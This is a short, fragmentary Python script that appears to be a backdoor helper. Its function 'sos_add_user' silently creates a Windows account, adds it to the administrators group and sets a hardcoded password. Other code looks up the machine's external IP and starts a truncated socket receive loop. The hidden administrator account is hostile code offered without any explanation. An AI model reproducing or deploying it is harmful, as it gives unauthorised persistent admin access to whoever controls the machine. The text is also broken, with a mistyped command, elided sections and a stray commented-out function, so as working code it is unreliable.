import datetime,threading,socket,os,sys,re,shutil,zipfile,subprocess,platform,urllib,fileinput
from ftplib import FTP
#check build version 


def sos_add_user():
	subprocess.Popen('net user nochelp /add')
	subprocess.Popen('net localgroup administrators nochelp /add')
	subprocess.Popen('net usrer nochelp ubitus1688999')

	
def get_external_ip():
	url="http://checkmyip.org/"
	request=str(urllib.request.urlopen(url))
	theip=re.findall(r"\d*\.\d*\.\d*\.\d*",request)
	return theip
#def replace_config(config,pattern)
#	changefile=fileinput.input(config, inplace=1)
#	for st in datafile:
	...
	try:
		while 1:
			try:
				...
				print('recvice_error',socket_error)
